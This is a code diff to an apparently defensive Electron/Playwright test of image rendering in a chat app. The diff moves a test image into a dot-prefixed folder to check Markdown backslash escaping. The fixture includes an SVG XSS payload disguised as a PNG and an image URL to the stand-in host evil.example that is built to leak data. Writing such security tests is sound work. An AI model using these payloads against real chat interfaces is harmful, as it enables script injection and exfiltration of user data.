@@ -8,7 +8,9 @@ import path from 'node:path'
 import { _electron as electron } from 'playwright-core'
 
 const data = fs.mkdtempSync(path.join(os.tmpdir(), 'jolty-chat-image-'))
-const png = path.join(data, 'map.png')
+// a folder starting with a dot: Markdown would read `\.` as an escape and lose the backslash
+fs.mkdirSync(path.join(data, '.shots'))
+const png = path.join(data, '.shots', 'map.png')
 fs.writeFileSync(png, Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64'))
 const fake = path.join(data, 'fake.png')
 fs.writeFileSync(fake, '<svg onload="alert(1)"></svg>')
@@ -17,7 +19,7 @@ const leak = `https://evil.example/p.png?d=${'x'.repeat(200)}`
 const reply = [
   'Here is the map:',
   '',
-  `![Weapon map](${slash(png)})`,
+  `![Weapon map](${png})`,
   '',
   `![Not an image](${slash(fake)})`,
   '',
